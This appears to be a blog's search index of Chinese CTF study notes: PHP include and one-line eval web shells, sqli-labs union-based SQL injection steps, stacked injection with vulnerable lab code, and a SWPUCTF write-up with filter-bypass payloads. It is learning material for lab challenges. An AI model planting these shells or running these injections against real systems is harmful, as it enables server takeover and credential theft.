<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php一句话木马</title>
    <link href="/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<p>了解一下php的include函数顺便了解一句话木马的各种形式</p><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><?php @eval($_POST['cmd']); ?><?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 POST 请求可以隐藏参数，避免在 URL 中暴露敏感数据，从而增加隐蔽性和安全性。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/10/09/nssctf2024/"/>
    <url>/2024/10/09/nssctf2024/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP躲猫猫"><a href="#PHP躲猫猫" class="headerlink" title="PHP躲猫猫"></a>PHP躲猫猫</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli练习</title>
    <link href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/"/>
    <url>/2024/10/06/sqli%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2024/10/01/sql/"/>
    <url>/2024/10/01/sql/</url>
    
    <content type="html"><![CDATA[<p>后面预计会把这些相同的文章全部集合起来，知识点主要都是做题得来得多做点题，省得什么都不会，难搞，也只有半年就要去考研了，唉ctfer起步太慢</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>先讲讲什么加堆叠注入,堆叠注入就是一条sql语句后面加;，多条语句一起执行，比如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>,其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity</span><br><span class="hljs-comment">//mysql connections for stacked query examples.</span><br><span class="hljs-variable">$con1</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con1</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    @<span class="hljs-title function_ invoke__">mysqli_select_db</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$dbname</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> ( <span class="hljs-string">&quot;Unable to connect to the database: <span class="hljs-subst">$dbname</span>&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>&#123;<br>    <br>    <br>    <span class="hljs-comment">/* store first result set */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Username is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Password is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//            mysqli_free_result($result);</span><br>    &#125;<br>        <span class="hljs-comment">/* print divider */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_more_results</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>            <span class="hljs-comment">//printf(&quot;-----------------\n&quot;);</span><br>    &#125;<br>     <span class="hljs-comment">//while (mysqli_next_result($con1));</span><br>&#125;<br><span class="hljs-keyword">else</span> <br>    &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>    &#125;<br><span class="hljs-comment">/* close connection */</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con1</span>);<br><br></code></pre></td></tr></table></figure><p>对输入的参数没有进行严格的过滤，攻击者构造恶意的攻击语句造成了SQL注入攻击，存在回显点，可以进行联合注入，并且如果出现错误，会输出报错信息，这里也可以使用显错注入。<br>还可以看到，这里的SQL语句查询使用的是mysqli_multi_query函数，mysqli_multi_query函数可以执行多条SQL语句。</p><p>别人得wp直接拿过来，下次给我启发<br>[SWPUCTF 2021 新生赛]sql</p><ol><li><p>测试</p><blockquote><p>?wllm&#x3D;1 – 正常<br>?wllm&#x3D;1’ – 报错<br>?wllm&#x3D;1’%23 –%23&gt;#– 正常<br>?wllm&#x3D;1’or 1&#x3D;1%23 – 发现有过滤  </p></blockquote></li><li><p>测试过滤</p><blockquote><p>空格，等号<br>空格&#x3D;&gt;&#x2F;xx&#x2F;<br>等号&#x3D;?like</p></blockquote></li><li><p>测试注入</p></li></ol><ul><li>测试长度  <blockquote><p>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;3%23 – 正常<br>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;4%23 – 错误<br>– 测试长度为3</p></blockquote></li><li>测试回显  <blockquote><p>?wlmm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23 # 2,3回显位置</p></blockquote></li><li>查库  <blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,database()%23 # test_db</p></blockquote></li><li>查表  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23 – LTLT_flag,users</p></blockquote></li><li>查列  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23<br>– id,flag,id,username</p></blockquote></li><li>查内容<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;test_db.LTLT_<br>flag%23<br>– NSSCTF{e99758c1-d31b</p></blockquote></li><li>位数长度不足<br>使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid</li><li>mid截取，因为回显只能有20个，所以20，一组截取<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,mid(group_concat(flag),20,20)&#x2F;**&#x2F;from&#x2F;**&#x2F;tes<br>t_db.LTLT_flag%23</p></blockquote></li><li>需要读三组<br>NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}</li></ul><p>写一个可能有问题得点,-1为什么有显示，1没有显示<br>布尔逻辑：<br>在某些情况下，数据库会对输入进行布尔评估。比如，如果原始查询是：</p><blockquote><p>SELECT * FROM users WHERE active &#x3D; 1;  </p></blockquote><p>如果数据库中没有任何记录的 active 字段为 1，那么这个查询不会返回任何结果。但如果用 -1 替代，可能会导致返回符合条件的结果。<br>错误处理和信息泄露：</p><p>数据库在处理 1 和 -1 时的错误处理方式可能不同。例如，如果 1 导致一个错误或异常，而 -1 不会，这可能会导致不同的行为。在某些系统中，-1 可能被用作特定的标志，表示某种状态或条件。</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newstartctf2024</title>
    <link href="/2024/10/01/newstartctf2024/"/>
    <url>/2024/10/01/newstartctf2024/</url>
    
    <content type="html"><![CDATA[<h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><p>说是前端其实只不过是我写ctf遇到问题在找解决方案罢了，下次不知道什么时候才会又遇见js，<br>js可以在控制台起到重要的功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">revealFlag</span>(<span class="hljs-params">className</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/flag/<span class="hljs-subst">$&#123;className&#125;</span>`</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                    &#125;<br>                &#125;);<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`恭喜你！你获得了第二部分的 flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="hljs-subst">$&#123;data.nextLevel&#125;</span>`</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 控制台提示</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>我们便可以直接在控制台完成命令执行，不过要按照js的要求来<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012101434.png" srcset="/img/loading.gif" lazyload></p><p>在我们没有办法修改源码时，我们想要修改页面的内容，可以按照下面的方法来</p><ol><li>打开开发者工具</li><li>找到想要修改的元素Element选项卡，找到元素，右键选择编辑</li></ol><p>放上题目源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;overlay&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>走不出的三年，走不出的苦夏<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>被羂索控制的夏油杰使用狱门疆封印了五条悟<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>你能救出五条老师吗？<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;seal_him&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>解封!!!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;state&quot;</span>&gt;</span>已封印<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">const</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;seal_him&#x27;</span>);<br>            <span class="hljs-keyword">const</span> stateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>);<br>            <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;message&#x27;</span>);<br><br>            form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>                event.<span class="hljs-title function_">preventDefault</span>();<br><br>  <br>                <span class="hljs-keyword">if</span> (stateElement.<span class="hljs-property">textContent</span>.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">&#x27;解封&#x27;</span>) &#123;<br>                    messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;如何是好？&#x27;</span>;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>                        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                        <span class="hljs-attr">headers</span>: &#123;<br>                            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                        &#125;,<br>                        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span> &#125;)<br>                    &#125;);<br><br>                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                        messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`第三部分Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, 你解救了五条悟！下一关: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span>`</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败，请重试。&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求过程中出现错误，请重试。&#x27;</span>;<br>                &#125;<br>            &#125;);<br>        &#125;);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>我们可以看出要修改的state为已封印<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012057999.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202410012058796.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202410012058224.png" srcset="/img/loading.gif" lazyload><br>，直接修改后点击即可完成目标</p><p>最后一个部分，很简单,明眼人直接看出来和noscript有关，我们直接修改noscript的内容即可，直接改成可执行的jscript，想不到我竟然搞错了，没学过js一下就显示出来了，我们应该在开发者工具中禁用js，就会显示另一个按钮<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012112831.png" srcset="/img/loading.gif" lazyload></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;overlay&quot;</span>&gt;&lt;/div&gt;<br>    &lt;div class=&quot;content&quot;&gt;<br>        